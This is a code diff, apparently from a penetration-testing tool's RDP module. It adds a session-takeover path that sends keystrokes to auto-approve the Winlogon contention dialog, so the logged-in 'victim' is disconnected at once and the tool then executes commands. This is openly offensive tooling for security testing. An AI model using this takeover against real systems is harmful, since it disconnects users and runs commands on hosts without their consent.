@@ -663,6 +663,7 @@ Add-Type -AssemblyName System.Windows.Forms
 
         # Check for active session contention before executing
         force = getattr(self.args, "force_rdp_exec", False)
+        session_state = RDPSessionState.CLEAR
         if not force:
             try:
                 probe_conn = self._create_rdp_connection(
@@ -687,7 +688,10 @@ Add-Type -AssemblyName System.Windows.Forms
                     if not approved:
                         self.logger.display("Existing RDP session preserved; command execution cancelled.")
                         return None
-                    # User approved — we'll reconnect without notifications to force takeover
+                    self.logger.display("Requesting RDP session takeover.")
+                    # User approved — we'll reconnect with notifications and
+                    # auto-approve the Winlogon dialog to avoid the default
+                    # 30-second victim-disconnect countdown.
                 elif session_state == RDPSessionState.UNKNOWN:
                     self.logger.fail(
                         "Server refused the RDP session; command execution cancelled. "
@@ -698,7 +702,56 @@ Add-Type -AssemblyName System.Windows.Forms
             finally:
                 await self.terminate_conn()
 
-        # Connect for execution WITHOUT logon notifications (silently takes over if needed)
+        # Connect for execution.  When contention was detected and approved,
+        # use logon notifications so we can auto-approve the Winlogon dialog
+        # immediately instead of waiting the 30-second victim-disconnect timer.
+        # After approval, the server sends SESSION_TERMINATE and drops our
+        # connection — we must reconnect to the freed session.
+        contention_approved = (not force) and (session_state == RDPSessionState.CONTENTION)
+        if contention_approved:
+            try:
+                self.conn = self._create_rdp_connection(
+                    self.auth,
+                    request_logon_notifications=True,
+                )
+                await self.connect_rdp()
+            except Exception as e:
+                self.logger.debug(f"Error connecting for takeover: {e!s}")
+                await self.terminate_conn()
+                return None
+
+            try:
+                pdu = await asyncio.wait_for(
+                    self.conn.logon_info_queue.get(),
+                    timeout=getattr(self.args, "session_check_timeout", 30),
+                )
+                if pdu is not None:
+                    notification = pdu.logon_errors
+                    if notification is not None and notification.is_session_contention:
+                        self.logger.debug("Re-detected contention; sending keyboard approval")
+                        # Winlogon "Another user is signed in" dialog:
+                        # "Yes" (left) and "No" (right, focused by default).
+                        # Tab moves focus to Yes, Enter activates it.
+                        layout = KeyboardLayoutManager().get_layout_by_shortname("enus")
+                        tab_sc = layout.vk_to_scancode("VK_TAB")
+                        await self.conn.send_key_scancode(tab_sc, True, False)
+                        await asyncio.sleep(0.05)
+                        await self.conn.send_key_scancode(tab_sc, False, False)
+                        await asyncio.sleep(0.3)
+                        await self._send_enter()
+                        self.logger.debug("Approval sent; waiting for server to free session")
+            except asyncio.TimeoutError:
+                self.logger.debug("No contention on takeover connection (proceeding)")
+
+            # Server sends SESSION_TERMINATE and drops us; wait for it
+            try:
+                await asyncio.wait_for(self.conn.disconnected_evt.wait(), timeout=15)
+            except asyncio.TimeoutError:
+                pass
+            await self.terminate_conn()
+            await asyncio.sleep(2)  # Brief pause for server to finalize session switch
+
+        # Final execution connection — victim has been disconnected
         try:
             self.conn = self._create_rdp_connection(self.auth)
             await self.connect_rdp()
